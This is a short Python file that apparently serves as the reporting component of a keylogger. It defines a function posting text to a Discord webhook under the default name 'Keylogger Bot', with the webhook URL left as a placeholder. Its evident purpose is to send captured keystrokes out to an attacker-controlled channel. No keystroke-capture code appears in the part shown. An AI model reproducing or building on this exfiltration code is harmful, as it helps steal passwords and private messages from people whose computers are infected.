import requests

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

def send_discord_message(content, username="Keylogger Bot"):
    payload = {
        "content": content,
        "username": username,
    }

    response = requests.post(WEBHOOK_URL, json=payload)

    if response.status_code != 204:
        print(f"Failed to send message: {response.status_code}, {response.text}")
    pass